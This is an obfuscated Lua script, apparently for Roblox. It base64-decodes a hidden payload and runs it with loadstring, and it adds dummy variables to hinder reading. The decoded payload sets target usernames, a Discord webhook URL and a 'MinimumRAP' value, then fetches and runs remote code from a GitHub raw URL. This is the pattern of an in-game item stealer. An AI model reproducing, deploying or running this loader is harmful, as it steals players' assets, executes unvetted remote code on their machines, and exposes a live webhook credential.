
local uwnczUZw = 'VXNlcm5hbWUgPSAibmV3YmVnaW5uZXIxMjM0NSIKVXNlcm5hbWUyID0gIjEyMzRuZXdiZWdpbm5lciIKV2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMjk2NDczOTE2MTU5Njg4ODI3L3Rmcl9ZYjMySDlsTkEtRFY3cHdPRkZjMGg0czlBaGpwREcySmtXY1dTYm1JQjdZTTF1YWhsN1A0amRoNENlNFFNLVpVIgpNaW5pbXVtUkFQID0gMTAwMDAKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9zaGFkb3dzenp6ei90aW1vY2l5L3JlZnMvaGVhZHMvbWFpbi9tYWluIiwgdHJ1ZSkpKCk='
local qnsERrqRKMEh = function(s) 
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; 
    s = string.gsub(s, '[^'..b..'=]', ''); 
    return (s:gsub('.', function(x) 
        if x == '=' then return '' end; 
        local r,f='',(b:find(x)-1); 
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end 
        return r; 
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) 
        if (#x ~= 8) then return '' end; 
        local c=0; 
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end 
        return string.char(c) 
    end)) 
end
local lUrGVxfxv = qnsERrqRKMEh(uwnczUZw)
loadstring(lUrGVxfxv)() -- Run decoded code

-- Dummy variables for confusion
local MMkZhcSPdf = math.random()
local jgqaJcNBN = "This is a dummy string"